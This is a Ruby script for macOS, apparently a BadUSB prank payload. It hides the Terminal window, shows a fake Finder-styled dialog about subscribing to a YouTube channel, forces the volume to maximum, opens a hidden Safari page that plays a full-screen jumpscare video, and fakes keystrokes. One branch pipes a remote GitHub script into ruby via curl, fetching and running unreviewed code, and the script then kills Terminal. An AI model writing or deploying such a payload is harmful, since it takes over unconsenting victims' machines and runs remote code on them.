#!/usr/bin/env ruby
require 'open-uri'
require 'tempfile'

# --- Hide Terminal Immediately ---
system("osascript -e 'tell application \"Terminal\" to set visible of front window to false'")

# --- Helper: Display Dialog with Finder Icon using AppleScript ---
def display_dialog(message, buttons, default)
  # Build button list.
  button_list = "{" + buttons.map { |b| "\"#{b}\"" }.join(", ") + "}"
  ascript = %Q{display dialog "#{message}" buttons #{button_list} default button "#{default}" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"}
  output = `osascript -e '#{ascript}'`
  if output =~ /button returned:\s*(.+)/
    return $1.strip
  else
    return nil
  end
end

# --- Volume Control: Set Volume to Maximum ---
def set_volume_to_max
  if system("command -v osascript > /dev/null 2>&1")
    system("osascript -e 'set volume output volume 100'")
  elsif system("command -v amixer > /dev/null 2>&1")
    system("amixer set Master 100%")
  else
    puts "Volume control not supported on this system."
  end
end

# --- Create Temporary HTML for Full-Screen Jumpscare ---
def create_jumpscare_html(video_url)
  html_content = <<-HTML
<html>
  <head>
    <meta charset="UTF-8">
    <title>JumpScare</title>
    <style>
      html, body {
        margin: 0; padding: 0; height: 100%; background-color: black;
      }
      video {
        width: 100%; height: 100%; object-fit: cover;
      }
    </style>
  </head>
  <body>
    <video id="video" autoplay muted playsinline>
      <source src="#{video_url}" type="video/mp4">
      Your browser does not support the video tag.
    </video>
    <script>
      var video = document.getElementById('video');
      video.play();
      video.addEventListener('loadeddata', function() {
        // After 500ms, request fullscreen and unmute.
        setTimeout(function(){
          if (video.requestFullscreen) {
            video.requestFullscreen();
          } else if (video.webkitRequestFullscreen) {
            video.webkitRequestFullscreen();
          } else if (video.msRequestFullscreen) {
            video.msRequestFullscreen();
          }
          video.muted = false;
          video.play();
        }, 500);
      });
    </script>
  </body>
</html>
  HTML
  temp = Tempfile.new(['jumpscare', '.html'])
  temp.write(html_content)
  temp.close
  temp.path
end

# --- Trigger a Jumpscare in Safari with "Sound Detection" Simulation ---
def trigger_jumpscare(video_url)
  set_volume_to_max
  html_file = create_jumpscare_html(video_url)
  # Open the temporary HTML file in Safari.
  system("open -a Safari '#{html_file}'")
  # Immediately hide Safari's front window.
  system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
  
  # Simulate waiting for sound detection (placeholder: wait 1 second).
  sleep 1
  
  # Simulate switching to the next Safari full-screen desktop by sending Control+Right Arrow.
  system("osascript -e 'tell application \"System Events\" to key code 124 using {control down}'")
  
  # Unhide Safari's front window so the jumpscare appears.
  system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
  
  # Let the jumpscare play for 1 second.
  sleep 1
end

# --- Run Secret (Rickroll) Script ---
def run_secret_script
  system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
end

# --- Subscriber Action ---
def subscriber_action(choice)
  ch = choice.strip.downcase
  case ch
  when "hawk"
    run_secret_script
  when "tuah"
    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
  when "sydney lover"
    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
  else
    puts "Unexpected button choice: #{choice}"
  end
end

# --- Main Program Flow ---

# First prompt: "Are you subscribed to MrWoooper?"
subscribed = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")
if subscribed.nil?
  puts "No response received. Exiting."
  exit 0
end

if subscribed.downcase == "no"
  # Non-subscriber branch: Immediately trigger jumpscare using jumpscare2.mp4.
  sleep 1
  video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
  trigger_jumpscare(video_url)
  system("killall Terminal")
  exit 0
else
  # Subscriber branch: Prompt with three buttons.
  button_choice = display_dialog("Choose a button:", ["Sydney lover", "Hawk", "Tuah"], "Hawk")
  if button_choice.nil?
    puts "No button chosen. Exiting."
    exit 0
  end
  subscriber_action(button_choice)
  system("killall Terminal")
  exit 0
end
